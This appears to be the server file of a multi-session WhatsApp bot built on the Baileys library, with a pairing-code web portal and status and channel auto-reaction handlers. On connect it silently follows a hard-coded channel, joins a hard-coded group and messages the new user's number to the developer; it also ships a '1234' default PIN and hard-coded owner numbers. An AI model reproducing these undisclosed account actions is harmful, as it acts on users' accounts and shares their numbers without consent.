// ============================================================================
// 📦 PACKAGES
// ============================================================================
const express = require('express');
const pino = require('pino');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const NodeCache = require('node-cache');
const fetch = require('node-fetch');
const {
  default: makeWASocket,
  DisconnectReason,
  delay,
  Browsers,
  makeCacheableSignalKeyStore,
  WAMessageStubType
} = require('@whiskeysockets/baileys');

// 🟢 Global Process Crash Guards
process.on('uncaughtException', (err) => {
  console.error('🛡️ Uncaught Exception Guard:', err?.message || err);
});
process.on('unhandledRejection', (err) => {
  console.error('🛡️ Unhandled Rejection Guard:', err?.message || err);
});

// 🟢 Config & DB Models
const { MONGODB_URI, BOT_NAME } = require('./config');
const { useMongoDBAuthState, Auth } = require('./auth');
const { askAI } = require('./ai');

// ============================================================================
// 🌍 GLOBAL CONSTANTS
// ============================================================================

const UPDATE_CHANNEL_JID = '120363421906774107@newsletter';
const BOT_CHANNEL_NAME = '✗ ʜᴇꜱʜᴀɴ ᴏꜰᴄ ✨';
const CHANNEL_REACTIONS = ['🩶', '💙', '❤️', '💛', '🧡', '💗', '🩵'];
const DEFAULT_BACKUP_LOGO = 'https://files.catbox.moe/a58add.jpeg';

const channelContext = {
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: UPDATE_CHANNEL_JID,
      newsletterName: BOT_CHANNEL_NAME,
      serverMessageId: 1
    }
  }
};
global.channelContext = channelContext;

const REAL_OWNER_NUMBER = '94719845166';
const OWNER_NUMBERS = [
  '94719845166',
  '94720882316',
  '15947733680169',
  '15947733680169@lid',
  '72787431583987',
  '72787431583987@lid'
];

const DEFAULT_SETTINGS = {
  workMode: 'public',
  autoStatusSeen: true,
  statusReact: true,
  statusReactEmoji: '💐',
  botLogo: DEFAULT_BACKUP_LOGO,
  autoPresence: 'off',
  autoChatRead: false,
  aiChatEnabled: false,
  antiDeleteEnabled: true,
  antiDeleteType: 'all',
  antiDeleteDest: 'me',
  securityPin: '1234',
  isFirstConnectDone: false
};

// ============================================================================
// 🧠 RUNTIME STATE & PERMANENT MESSAGE STORE
// ============================================================================

const settingsCache = new NodeCache({ stdTTL: 300, checkperiod: 60, maxKeys: 200 });
// පැය 4ක් යනතුරු ලැබෙන messages මතක තබා ගන්නා cache එක
const globalMsgStore = new NodeCache({ stdTTL: 14400, checkperiod: 300, maxKeys: 20000 });

const activeSessions = {};
global.activeSessions = activeSessions;
const isStarting = {};
const reconnectAttempts = {};
const commands = new Map();

// ============================================================================
// 🗄️ DATABASE SCHEMA & HELPERS
// ============================================================================

function createSettingsModel() {
  const SettingsSchema = new mongoose.Schema({
    _id: { type: String, required: true },
    workMode: { type: String, default: DEFAULT_SETTINGS.workMode },
    autoStatusSeen: { type: Boolean, default: DEFAULT_SETTINGS.autoStatusSeen },
    statusReact: { type: Boolean, default: DEFAULT_SETTINGS.statusReact },
    statusReactEmoji: { type: String, default: DEFAULT_SETTINGS.statusReactEmoji },
    botLogo: { type: String, default: DEFAULT_SETTINGS.botLogo },
    autoPresence: { type: String, default: DEFAULT_SETTINGS.autoPresence },
    autoChatRead: { type: Boolean, default: DEFAULT_SETTINGS.autoChatRead },
    aiChatEnabled: { type: Boolean, default: DEFAULT_SETTINGS.aiChatEnabled },
    antiDeleteEnabled: { type: Boolean, default: DEFAULT_SETTINGS.antiDeleteEnabled },
    antiDeleteType: { type: String, default: DEFAULT_SETTINGS.antiDeleteType },
    antiDeleteDest: { type: String, default: DEFAULT_SETTINGS.antiDeleteDest },
    securityPin: { type: String, default: DEFAULT_SETTINGS.securityPin },
    isFirstConnectDone: { type: Boolean, default: DEFAULT_SETTINGS.isFirstConnectDone }
  });

  return mongoose.models.BotSettings || mongoose.model('BotSettings', SettingsSchema);
}

const SettingsModel = createSettingsModel();

function clearSettingsCache(num) {
  if (num) settingsCache.del(num);
}
global.clearSettingsCache = clearSettingsCache;

async function getBotSettings(botNum) {
  if (!botNum) return { ...DEFAULT_SETTINGS };
  const cached = settingsCache.get(botNum);
  if (cached) return cached;

  try {
    let settings = await SettingsModel.findById(botNum).lean();
    if (!settings) {
      const created = await SettingsModel.create({ _id: botNum, ...DEFAULT_SETTINGS });
      settings = created.toObject();
    }
    settingsCache.set(botNum, settings);
    return settings;
  } catch (e) {
    return { ...DEFAULT_SETTINGS };
  }
}
global.getBotSettings = getBotSettings;

// ============================================================================
// 📂 COMMAND LOADER
// ============================================================================

function registerCommandAliases(cmd, cmdName) {
  if (cmd && cmd.name) commands.set(cmd.name.toLowerCase(), cmd);
  commands.set(cmdName, cmd);

  if (cmd && cmd.alias) {
    if (Array.isArray(cmd.alias)) {
      for (const al of cmd.alias) commands.set(al.toLowerCase(), cmd);
    } else if (typeof cmd.alias === 'string') {
      commands.set(cmd.alias.toLowerCase(), cmd);
    }
  }
}

function loadCommandFile(cmdDir, file) {
  try {
    let cmd = require(path.join(cmdDir, file));
    if (cmd.default) cmd = cmd.default;
    const cmdName = file.replace('.js', '').toLowerCase();
    registerCommandAliases(cmd, cmdName);
  } catch (e) {
    console.error(`❌ Error loading ${file}:`, e.message);
  }
}

function loadAllCommands() {
  const cmdDir = path.join(__dirname, 'commands');
  if (!fs.existsSync(cmdDir)) return;
  const cmdFiles = fs.readdirSync(cmdDir).filter(f => f.endsWith('.js'));
  for (const file of cmdFiles) {
    loadCommandFile(cmdDir, file);
  }
}

function findCommand(...names) {
  for (const name of names) {
    const cmd = commands.get(name);
    if (cmd) return cmd;
  }
  return null;
}

function getCommandExecutor(cmd) {
  if (typeof cmd === 'function') return cmd;
  if (cmd && typeof cmd.execute === 'function') return cmd.execute;
  if (cmd && typeof cmd.run === 'function') return cmd.run;
  if (cmd && typeof cmd.downloadAndSendStatus === 'function') return cmd.downloadAndSendStatus;
  return null;
}

// ============================================================================
// 🌐 LUXURY RED-BLACK GLASSMORPHIC PORTAL (PREMIUM ANIMATED EDITION)
// ============================================================================

function renderPortalHtml(botName) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
      <title>${botName} • PAIRING STATION</title>
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
      <style>
        :root {
          --bg-core: #090305;
          --panel-bg: rgba(20, 6, 10, 0.72);
          --header-bg: rgba(10, 3, 5, 0.55);
          --accent-red: #e11d48;
          --accent-glow: rgba(225, 29, 72, 0.35);
          --crimson-soft: #fb7185;
          --border-glass: rgba(244, 63, 94, 0.22);
          --border-focus: rgba(244, 63, 94, 0.65);
          --text-main: #fcfcfd;
          --text-muted: #9f8e93;
          --success-green: #22c55e;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body { height: 100%; }

        body {
          background-color: var(--bg-core);
          background-image:
            radial-gradient(circle at 50% 0%, rgba(225, 29, 72, 0.22) 0%, transparent 60%),
            radial-gradient(circle at 10% 90%, rgba(159, 18, 57, 0.15) 0%, transparent 45%),
            radial-gradient(circle at 90% 20%, rgba(190, 18, 60, 0.12) 0%, transparent 50%);
          background-size: 200% 200%;
          animation: bgDrift 16s ease-in-out infinite;
          color: var(--text-main);
          font-family: 'Outfit', sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100dvh;
          width: 100%;
          padding: 12px;
          overflow: hidden;
          position: relative;
        }

        @keyframes bgDrift {
          0% { background-position: 0% 0%, 0% 100%, 100% 0%; }
          50% { background-position: 30% 20%, 20% 80%, 70% 30%; }
          100% { background-position: 0% 0%, 0% 100%, 100% 0%; }
        }

        /* Floating glow orbs */
        .orb {
          position: fixed;
          border-radius: 50%;
          filter: blur(50px);
          opacity: 0.5;
          pointer-events: none;
          z-index: 0;
        }
        .orb-1 {
          width: 260px; height: 260px;
          background: radial-gradient(circle, rgba(225,29,72,0.55), transparent 70%);
          top: -80px; left: -80px;
          animation: floatOrb1 11s ease-in-out infinite;
        }
        .orb-2 {
          width: 220px; height: 220px;
          background: radial-gradient(circle, rgba(251,113,133,0.45), transparent 70%);
          bottom: -70px; right: -60px;
          animation: floatOrb2 13s ease-in-out infinite;
        }
        .orb-3 {
          width: 160px; height: 160px;
          background: radial-gradient(circle, rgba(159,18,57,0.5), transparent 70%);
          top: 60%; left: 85%;
          animation: floatOrb3 9s ease-in-out infinite;
        }
        @keyframes floatOrb1 {
          0%, 100% { transform: translate(0, 0) scale(1); }
          50% { transform: translate(40px, 60px) scale(1.15); }
        }
        @keyframes floatOrb2 {
          0%, 100% { transform: translate(0, 0) scale(1); }
          50% { transform: translate(-35px, -45px) scale(1.1); }
        }
        @keyframes floatOrb3 {
          0%, 100% { transform: translate(0, 0) scale(1); }
          50% { transform: translate(-25px, 30px) scale(1.2); }
        }

        /* ===== HEADER ===== */
        .top-header {
          position: relative;
          z-index: 2;
          width: 100%;
          max-width: 440px;
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 10px 16px;
          margin-bottom: 14px;
          border-radius: 18px;
          background: var(--header-bg);
          border: 1px solid var(--border-glass);
          backdrop-filter: blur(18px);
          animation: fadeSlideIn 0.6s ease both;
          flex-shrink: 0;
        }
        .header-logo {
          width: 34px; height: 34px; border-radius: 10px; flex-shrink: 0;
          background: linear-gradient(135deg, #be123c, var(--accent-red));
          display: flex; align-items: center; justify-content: center;
          font-weight: 800; font-size: 15px; color: #fff;
          box-shadow: 0 0 14px var(--accent-glow);
          animation: pulseDot 2.4s ease-in-out infinite;
        }
        .header-text { text-align: left; line-height: 1.25; overflow: hidden; }
        .header-title {
          font-size: 13.5px; font-weight: 800; letter-spacing: 0.3px;
          white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }
        .header-sub { font-size: 10px; color: var(--text-muted); letter-spacing: 0.6px; text-transform: uppercase; }
        .header-live {
          margin-left: auto; display: flex; align-items: center; gap: 5px;
          font-size: 10px; font-weight: 700; color: var(--crimson-soft);
          letter-spacing: 0.6px; flex-shrink: 0;
        }

        .portal-card {
          background: var(--panel-bg);
          backdrop-filter: blur(28px) saturate(160%);
          border: 1px solid var(--border-glass);
          border-radius: 28px;
          padding: 34px 30px;
          width: 100%;
          max-width: 440px;
          text-align: center;
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65), 0 0 45px var(--accent-glow);
          position: relative;
          overflow: hidden;
          z-index: 1;
          animation: cardEntrance 0.8s cubic-bezier(0.16, 1, 0.3, 1);
          max-height: 100%;
          overflow-y: auto;
        }

        @keyframes cardEntrance {
          0% { opacity: 0; transform: translateY(28px) scale(0.96); }
          100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        .portal-card::before {
          content: '';
          position: absolute;
          top: 0; left: 0; right: 0; height: 3px;
          background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
          background-size: 200% 100%;
          animation: shimmerBar 3s linear infinite;
        }
        @keyframes shimmerBar {
          0% { background-position: 200% 0; }
          100% { background-position: -200% 0; }
        }

        .badge-status {
          display: inline-flex; align-items: center; gap: 7px;
          font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
          color: var(--crimson-soft); background: rgba(225, 29, 72, 0.12);
          border: 1px solid rgba(225, 29, 72, 0.28); padding: 5px 14px; border-radius: 30px; margin-bottom: 18px;
          animation: fadeSlideIn 0.7s ease 0.1s both;
        }
        .badge-dot {
          width: 6px; height: 6px; background: var(--accent-red); border-radius: 50%;
          box-shadow: 0 0 8px var(--accent-red);
          animation: pulseDot 1.6s ease-in-out infinite;
        }
        @keyframes pulseDot {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.4; transform: scale(1.5); }
        }

        .app-title {
          font-size: 26px; font-weight: 800; letter-spacing: -0.5px;
          background: linear-gradient(135deg, #ffffff 40%, var(--crimson-soft) 80%, var(--accent-red) 100%);
          background-size: 200% auto;
          -webkit-background-clip: text; -webkit-text-fill-color: transparent;
          margin-bottom: 6px;
          animation: fadeSlideIn 0.7s ease 0.2s both, titleShine 5s linear infinite 1s;
        }
        @keyframes titleShine {
          0% { background-position: 0% center; }
          100% { background-position: 200% center; }
        }
        @keyframes fadeSlideIn {
          0% { opacity: 0; transform: translateY(10px); }
          100% { opacity: 1; transform: translateY(0); }
        }

        .app-desc {
          font-size: 13px; color: var(--text-muted); margin-bottom: 24px; font-weight: 400;
          animation: fadeSlideIn 0.7s ease 0.3s both;
        }

        .input-wrap { position: relative; margin-bottom: 14px; animation: fadeSlideIn 0.7s ease 0.4s both; }
        .phone-input {
          width: 100%; padding: 15px 20px; border-radius: 16px; border: 1px solid var(--border-glass);
          background: rgba(12, 3, 6, 0.7); color: var(--text-main); font-size: 16px; font-weight: 600;
          letter-spacing: 0.8px; text-align: center; outline: none; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .phone-input:focus { border-color: var(--border-focus); box-shadow: 0 0 24px rgba(225, 29, 72, 0.35); background: rgba(18, 4, 9, 0.9); }

        .btn-action {
          width: 100%; padding: 15px; border-radius: 16px; border: none;
          background: linear-gradient(135deg, #be123c 0%, var(--accent-red) 100%);
          color: #ffffff; font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.25s ease;
          box-shadow: 0 8px 24px rgba(225, 29, 72, 0.3); margin-bottom: 6px;
          position: relative; overflow: hidden;
          animation: fadeSlideIn 0.7s ease 0.5s both;
          display: flex; align-items: center; justify-content: center; gap: 9px;
        }
        .btn-action::after {
          content: '';
          position: absolute;
          top: 0; left: -75%;
          width: 50%; height: 100%;
          background: linear-gradient(120deg, transparent, rgba(255,255,255,0.35), transparent);
          transform: skewX(-20deg);
          animation: btnShine 2.8s ease-in-out infinite;
        }
        @keyframes btnShine {
          0% { left: -75%; }
          50% { left: 130%; }
          100% { left: 130%; }
        }
        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(225, 29, 72, 0.45); }
        .btn-action:disabled { opacity: 0.85; cursor: not-allowed; transform: none; }
        .btn-action:disabled::after { animation: none; display: none; }

        /* Button loading spinner */
        .btn-spinner {
          width: 15px; height: 15px; border-radius: 50%;
          border: 2px solid rgba(255,255,255,0.35);
          border-top-color: #fff;
          animation: spin 0.7s linear infinite;
          display: none;
        }
        .btn-action.loading .btn-spinner { display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Generating panel shown while waiting for the code */
        .generating-panel {
          display: none;
          margin-top: 20px;
          padding: 22px 16px;
          border-radius: 16px;
          border: 1px dashed var(--border-glass);
          background: rgba(225, 29, 72, 0.06);
          animation: fadeSlideIn 0.4s ease both;
        }
        .generating-panel.show { display: block; }
        .pulse-ring-wrap {
          position: relative;
          width: 58px; height: 58px;
          margin: 0 auto 14px;
          display: flex; align-items: center; justify-content: center;
        }
        .pulse-ring {
          position: absolute; inset: 0;
          border-radius: 50%;
          border: 2px solid var(--accent-red);
          animation: ringExpand 1.6s ease-out infinite;
        }
        .pulse-ring:nth-child(2) { animation-delay: 0.5s; }
        .pulse-ring:nth-child(3) { animation-delay: 1s; }
        @keyframes ringExpand {
          0% { transform: scale(0.4); opacity: 0.9; }
          100% { transform: scale(1.4); opacity: 0; }
        }
        .pulse-core {
          width: 16px; height: 16px; border-radius: 50%;
          background: var(--accent-red);
          box-shadow: 0 0 16px var(--accent-red);
          animation: pulseDot 1.2s ease-in-out infinite;
        }
        .generating-text {
          font-size: 12.5px; font-weight: 600; color: var(--crimson-soft);
          letter-spacing: 0.4px;
        }
        .generating-dots::after {
          content: '';
          animation: dotsCycle 1.4s steps(4, end) infinite;
        }
        @keyframes dotsCycle {
          0% { content: ''; }
          25% { content: '.'; }
          50% { content: '..'; }
          75% { content: '...'; }
          100% { content: ''; }
        }

        .code-container { display: none; margin-top: 22px; }
        .code-container.show { display: block; animation: codeReveal 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes codeReveal {
          from { opacity: 0; transform: translateY(10px) scale(0.97); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .code-box {
          font-family: 'JetBrains Mono', monospace; font-size: 30px; font-weight: 800; letter-spacing: 5px;
          color: #ffe4e6; background: rgba(225, 29, 72, 0.14); border: 1.5px dashed rgba(251, 113, 133, 0.45);
          padding: 16px; border-radius: 16px; cursor: pointer; transition: all 0.25s ease;
          animation: codeGlow 2.4s ease-in-out infinite;
        }
        @keyframes codeGlow {
          0%, 100% { box-shadow: 0 0 0px rgba(225, 29, 72, 0); }
          50% { box-shadow: 0 0 26px rgba(225, 29, 72, 0.35); }
        }
        .code-box:hover { background: rgba(225, 29, 72, 0.22); border-color: var(--crimson-soft); transform: scale(1.02); }

        .copy-tag { font-size: 11px; color: var(--text-muted); margin-top: 8px; font-weight: 500; }

        .btn-copy {
          width: 100%; margin-top: 14px; padding: 13px; border-radius: 14px;
          border: 1px solid rgba(251, 113, 133, 0.35);
          background: rgba(225, 29, 72, 0.1); color: var(--crimson-soft);
          font-size: 13px; font-weight: 700; letter-spacing: 0.4px; cursor: pointer;
          display: flex; align-items: center; justify-content: center; gap: 8px;
          transition: all 0.25s ease;
        }
        .btn-copy:hover { background: rgba(225, 29, 72, 0.2); transform: translateY(-1px); box-shadow: 0 6px 18px rgba(225, 29, 72, 0.25); }
        .btn-copy.copied { background: rgba(34, 197, 94, 0.15); border-color: rgba(34, 197, 94, 0.5); color: #4ade80; }
        .btn-copy svg { width: 15px; height: 15px; flex-shrink: 0; }

        .footer-note {
          margin-top: 20px; font-size: 10.5px; letter-spacing: 1px; color: rgba(255, 255, 255, 0.25); text-transform: uppercase;
          animation: fadeSlideIn 0.7s ease 0.6s both;
        }

        /* ===== TOAST (replaces native alert popups) ===== */
        .toast-stack {
          position: fixed;
          top: max(14px, env(safe-area-inset-top));
          left: 50%;
          transform: translateX(-50%);
          z-index: 50;
          width: calc(100% - 28px);
          max-width: 420px;
          display: flex;
          flex-direction: column;
          gap: 8px;
          pointer-events: none;
        }
        .toast {
          pointer-events: auto;
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 13px 16px;
          border-radius: 14px;
          font-size: 12.5px;
          font-weight: 600;
          color: var(--text-main);
          background: rgba(20, 6, 10, 0.92);
          border: 1px solid var(--border-glass);
          backdrop-filter: blur(18px);
          box-shadow: 0 10px 30px rgba(0,0,0,0.5);
          animation: toastIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .toast.success { border-color: rgba(34, 197, 94, 0.4); }
        .toast.error { border-color: rgba(225, 29, 72, 0.5); }
        .toast.leaving { animation: toastOut 0.3s ease forwards; }
        @keyframes toastIn {
          from { opacity: 0; transform: translateY(-14px) scale(0.96); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes toastOut {
          to { opacity: 0; transform: translateY(-10px) scale(0.96); }
        }
        .toast-icon { font-size: 15px; flex-shrink: 0; }
        .toast-text { flex: 1; text-align: left; line-height: 1.4; }

        @media (max-height: 700px) {
          .portal-card { padding: 24px 24px; }
          .app-title { font-size: 22px; }
          .app-desc { margin-bottom: 18px; }
          .code-box { font-size: 24px; letter-spacing: 3px; padding: 13px; }
        }
        @media (max-width: 480px) {
          .app-title { font-size: 23px; }
          .code-box { font-size: 25px; letter-spacing: 3px; }
        }
      </style>
    </head>
    <body>
      <div class="orb orb-1"></div>
      <div class="orb orb-2"></div>
      <div class="orb orb-3"></div>

      <div class="toast-stack" id="toastStack"></div>

      <div class="top-header">
        <div class="header-logo">✗</div>
        <div class="header-text">
          <div class="header-title">${botName}</div>
          <div class="header-sub">Pairing Station</div>
        </div>
        <div class="header-live"><span class="badge-dot"></span> LIVE</div>
      </div>

      <div class="portal-card">
        <div class="badge-status"><span class="badge-dot"></span> Online System</div>
        <h1 class="app-title">${botName}</h1>
        <p class="app-desc">Enter phone number with country code</p>
        <div class="input-wrap">
          <input type="text" id="phone" class="phone-input" placeholder="e.g. 9470xxxxxxx" inputmode="numeric" />
        </div>
        <button id="btn" class="btn-action" onclick="fetchPairCode()">
          <span class="btn-spinner"></span>
          <span id="btnLabel">GET PAIRING CODE</span>
        </button>

        <div class="generating-panel" id="generatingPanel">
          <div class="pulse-ring-wrap">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-core"></div>
          </div>
          <div class="generating-text">Generating your pairing code<span class="generating-dots"></span></div>
        </div>

        <div class="code-container" id="codeWrapper">
          <div class="code-box" id="codeDisplay" onclick="copyCode()"></div>
          <div class="copy-tag">Click code to copy to clipboard</div>
          <button class="btn-copy" id="copyBtn" onclick="copyCode()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            <span id="copyBtnText">COPY CODE</span>
          </button>
        </div>
        <p class="footer-note">Powered by Heshan MD</p>
      </div>

      <script>
        function showToast(message, type) {
          const stack = document.getElementById('toastStack');
          const toast = document.createElement('div');
          toast.className = 'toast ' + (type || 'success');
          const icon = type === 'error' ? '⚠️' : '✅';
          toast.innerHTML = '<span class="toast-icon">' + icon + '</span><span class="toast-text"></span>';
          toast.querySelector('.toast-text').innerText = message;
          stack.appendChild(toast);
          setTimeout(() => {
            toast.classList.add('leaving');
            setTimeout(() => toast.remove(), 320);
          }, 3200);
        }

        async function fetchPairCode() {
          const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
          if (!phone || phone.length < 10) {
            showToast('කරුණාකර නිවැරදි Country Code සහිත අංකය ඇතුළත් කරන්න!', 'error');
            return;
          }
          const btn = document.getElementById('btn');
          const btnLabel = document.getElementById('btnLabel');
          const wrapper = document.getElementById('codeWrapper');
          const display = document.getElementById('codeDisplay');
          const copyBtn = document.getElementById('copyBtn');
          const copyBtnText = document.getElementById('copyBtnText');
          const genPanel = document.getElementById('generatingPanel');

          btn.classList.add('loading');
          btnLabel.innerText = 'GENERATING...';
          btn.disabled = true;
          wrapper.classList.remove('show');
          wrapper.style.display = 'none';
          copyBtn.classList.remove('copied');
          copyBtnText.innerText = 'COPY CODE';
          genPanel.classList.add('show');

          try {
            const res = await fetch('/pair?num=' + phone);
            const data = await res.json();
            genPanel.classList.remove('show');
            if (data.code) {
              display.innerText = data.code;
              wrapper.style.display = 'block';
              requestAnimationFrame(() => wrapper.classList.add('show'));
              navigator.clipboard.writeText(data.code).catch(()=>{});
              showToast('Pairing Code Ready: ' + data.code, 'success');
            } else {
              showToast(data.error || 'Connection busy. Please wait 10 seconds and retry.', 'error');
            }
          } catch(e) {
            genPanel.classList.remove('show');
            showToast('Server connection error. Refresh page and retry!', 'error');
          }
          btn.classList.remove('loading');
          btnLabel.innerText = 'GET PAIRING CODE';
          btn.disabled = false;
        }

        function copyCode() {
          const code = document.getElementById('codeDisplay').innerText;
          const copyBtn = document.getElementById('copyBtn');
          const copyBtnText = document.getElementById('copyBtnText');
          if (code) {
            navigator.clipboard.writeText(code).then(() => {
              copyBtn.classList.add('copied');
              copyBtnText.innerText = 'COPIED!';
              showToast('Copied to clipboard', 'success');
              setTimeout(() => {
                copyBtn.classList.remove('copied');
                copyBtnText.innerText = 'COPY CODE';
              }, 2000);
            }).catch(() => {
              showToast('Copy failed. Code: ' + code, 'error');
            });
          }
        }
      </script>
    </body>
    </html>
  `;
}

function registerPortalRoute(app) {
  app.get('/', (req, res) => {
    res.send(renderPortalHtml(BOT_NAME));
  });
}

// ============================================================================
// 🔌 SOCKET CREATION
// ============================================================================

async function createBaileysSocket(phoneNumber) {
  const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(phoneNumber);
  const logger = pino({ level: 'silent' });
  const msgRetryCounterCache = new NodeCache({ stdTTL: 180, checkperiod: 60, maxKeys: 300 });

  const sock = makeWASocket({
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
    logger,
    printQRInTerminal: false,
    browser: Browsers.ubuntu('Chrome'),
    msgRetryCounterCache,
    syncFullHistory: false,
    shouldSyncHistoryMessage: () => false,
    fireInitQueries: true,
    generateHighQualityLinkPreview: false,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    keepAliveIntervalMs: 25000,
    markOnlineOnConnect: true,
    emitOwnEvents: false,
    shouldIgnoreJid: () => false
  });

  sock.ev.on('creds.update', saveCreds);
  return { sock, clearSessionData };
}

// ============================================================================
// 🔄 CONNECTION LIFECYCLE
// ============================================================================

async function handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData) {
  const statusCode = lastDisconnect?.error?.output?.statusCode;
  console.log(`⚠️ Connection closed (${phoneNumber}), Code:${statusCode}`);

  try {
    sock.ev.removeAllListeners();
    sock.ws?.close();
  } catch (e) {}

  delete activeSessions[phoneNumber];

  if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
    console.log(`❌ Permanent session logout: ${phoneNumber}`);
    delete reconnectAttempts[phoneNumber];
    if (typeof clearSessionData === 'function') await clearSessionData();
    return;
  }

  reconnectAttempts[phoneNumber] = (reconnectAttempts[phoneNumber] || 0) + 1;
  let delayTime = 6000;

  if (statusCode === 440) {
    delayTime = Math.min(reconnectAttempts[phoneNumber] * 12000, 45000);
  } else if (reconnectAttempts[phoneNumber] > 5) {
    delayTime = 25000;
  }

  setTimeout(() => {
    initWhatsApp(phoneNumber);
  }, delayTime);
}

async function autoFollowChannelAndJoinGroup(sock, phoneNumber) {
  await delay(2500);
  try {
    const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
    if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
      const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
      if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
    }
  } catch (e) {}

  try {
    const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X';
    if (typeof sock.groupAcceptInvite === 'function') {
      await sock.groupAcceptInvite(groupInviteCode);
    }
  } catch (e) {}
}

function buildConnectedMessage(botNum) {
  return `*✦ ${BOT_NAME} CONNECTED ✦*
━━━━━━━━━━━━━━━━━━━━━
• *Number*    : +${botNum}
• *Engine*    : HESHAN-MD V2
• *Features*  : Auto Status | Anti-Delete
• *State*     : Online (24/7 Cloud)
━━━━━━━━━━━━━━━━━━━━━
> Type *.menu* to explore all commands.`.trim();
}

async function sendFirstConnectAlerts(sock, phoneNumber) {
  try {
    const botNum = sock.user?.id
      ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '')
      : phoneNumber.replace(/[^0-9]/g, '');

    const botJid = `${botNum}@s.whatsapp.net`;
    const creatorJid = `${REAL_OWNER_NUMBER}@s.whatsapp.net`;

    const currentSettings = await getBotSettings(botNum);
    if (currentSettings.isFirstConnectDone) return;

    const sessionLogo = currentSettings.botLogo || DEFAULT_BACKUP_LOGO;
    const connectedMsg = buildConnectedMessage(botNum);

    const connectPayload = {
      image: { url: sessionLogo },
      caption: connectedMsg,
      ...global.channelContext
    };

    await sock.sendMessage(botJid, connectPayload).catch(() => {
      sock.sendMessage(botJid, { text: connectedMsg, ...global.channelContext }).catch(() => {});
    });

    if (!botNum.includes(REAL_OWNER_NUMBER)) {
      const alertMsg = `*🔔 ALERT : NEW SESSION CONNECTED*
━━━━━━━━━━━━━━━━━━━━━
• *Number* : +${botNum}
• *System* : Initialized successfully
━━━━━━━━━━━━━━━━━━━━━`;
      await sock.sendMessage(creatorJid, { text: alertMsg, ...global.channelContext }).catch(() => {});
    }

    await SettingsModel.findByIdAndUpdate(botNum, { isFirstConnectDone: true }, { upsert: true });
    clearSettingsCache(botNum);
  } catch (e) {}
}

function handleConnectionOpen(sock, phoneNumber) {
  console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
  reconnectAttempts[phoneNumber] = 0;
  autoFollowChannelAndJoinGroup(sock, phoneNumber);
  setTimeout(() => sendFirstConnectAlerts(sock, phoneNumber), 3000);
}

function registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData) {
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      await handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSessionData);
    } else if (connection === 'open') {
      handleConnectionOpen(sock, phoneNumber);
    }
  });
}

// ============================================================================
// 💬 MESSAGE HANDLING HELPERS
// ============================================================================

async function reactToChannelPost(sock, msg, chatJid) {
  try {
    const randomEmoji = CHANNEL_REACTIONS[Math.floor(Math.random() * CHANNEL_REACTIONS.length)];
    await delay(Math.floor(Math.random() * 3000) + 1200);

    const serverId = msg.message?.newsletterAdminInviteMessage?.newsletterJid || msg.key?.server_id || msg.key?.id;
    if (typeof sock.newsletterReactMessage === 'function' && serverId) {
      await sock.newsletterReactMessage(chatJid, serverId, randomEmoji);
    } else {
      await sock.sendMessage(chatJid, { react: { text: randomEmoji, key: msg.key } });
    }
  } catch (err) {}
}

async function simulateAutoPresence(sock, chatJid, settings) {
  if (!settings.autoPresence || settings.autoPresence === 'off') return;
  try {
    const type = settings.autoPresence === 'recording' ? 'recording' : 'composing';
    await sock.sendPresenceUpdate(type, chatJid);
  } catch (err) {}
}

async function handleStatusBroadcast(sock, msg, settings) {
  if (!settings.autoStatusSeen) return;
  try {
    await sock.readMessages([msg.key]);
    if (settings.statusReact && msg.key.participant) {
      await sock.sendMessage(
        'status@broadcast',
        { react: { text: settings.statusReactEmoji || '💐', key: msg.key } },
        { statusJidList: [msg.key.participant] }
      );
    }
  } catch (e) {}
}

